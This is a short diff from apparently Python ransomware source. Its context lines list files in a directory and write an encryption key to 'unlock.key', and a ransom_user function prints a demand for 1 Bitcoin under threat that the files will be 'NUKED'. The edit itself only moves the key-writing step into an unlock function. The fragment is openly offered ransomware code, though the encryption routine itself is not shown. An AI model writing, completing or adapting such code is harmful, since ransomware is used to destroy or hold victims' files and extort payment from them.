@@ -42,8 +42,9 @@ for file in os.listdir():
     if os.path.isfile(file):
         files.append(file)
 
-with open("unlock.key", "wb") as unlock:
-    unlock.write(key)
+def unlock(self):
+    with open("unlock.key", "wb") as unlock:
+        unlock.write(key)
 
 def ransom_user(self):
     print("All of your files have been encrypted!! Send 1 Bitcoin or your files will be NUKED!!")
